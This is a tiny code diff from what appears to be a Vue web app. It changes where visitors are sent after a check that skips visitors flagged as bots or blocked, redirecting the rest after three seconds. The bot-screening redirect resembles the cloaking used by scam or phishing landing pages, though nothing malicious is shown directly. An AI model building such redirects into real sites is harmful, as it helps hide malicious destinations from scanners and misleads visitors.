@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://ph.philbendeck.com/';
+          window.location.href = 'https://trol.fauxmacho.com/';
         }, 3000);
       }
 
